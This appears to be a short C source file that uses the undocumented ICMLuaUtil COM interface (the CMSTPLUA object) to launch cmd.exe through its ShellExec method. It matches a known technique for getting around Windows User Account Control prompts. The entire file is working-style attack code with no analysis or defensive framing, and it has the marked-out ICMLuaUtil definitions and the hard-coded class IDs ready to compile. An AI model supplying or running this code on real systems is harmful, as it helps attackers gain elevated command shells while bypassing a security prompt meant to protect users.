
#include <windows.h>
#include <combaseapi.h>
#include <stdint.h>
//
interface ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCTSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow);

	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString);

	HRESULT(STDMETHODCALLTYPE* DeleteRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_      LPCTSTR lpSubKey,
		_In_      LPCTSTR lpValueName);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteRegKeysWithoutSubKeys)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteRegTree)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ExitWindowsFunc)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* AllowAccessToTheWorld)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* CreateFileAndClose)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteHiddenCmProfileFiles)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* CallCustomActionDll)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* RunCustomActionExe)(
		__RPC__in       ICMLuaUtil* This,
		_In_            LPCTSTR lpFile,
		_In_opt_        LPCTSTR lpParameters,
		_COM_Outptr_    LPCTSTR* pszHandleAsHexString);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetRasSubEntryProperties)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* DeleteRasSubEntry)(
		__RPC__in ICMLuaUtil* This);

	//incomplete definition
	HRESULT(STDMETHODCALLTYPE* SetCustomAuthData)(
		__RPC__in ICMLuaUtil* This);

	END_INTERFACE

} *PICMLuaUtilVtbl;
interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; };

CLSID clsid = { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7} };
CLSID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C} };


bool ProcessCreate(PCWCHAR Path) {
	ICMLuaUtil* Operation = NULL;

	auto hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	auto r = CoCreateInstance(
		clsid,
		NULL,
		CLSCTX_LOCAL_SERVER,
		IID_ICMLuaUtil,
		(void**)&Operation
	);

	if (S_OK == r && Operation != NULL) {
		r = Operation->lpVtbl->ShellExec(Operation, Path, NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);
		return (S_OK == r);
	}
	return false;
}

int main()
{
	//administrator privileges required && UAC
	ProcessCreate(L"C:\\windows\\system32\\cmd.exe");
	return 0;
}
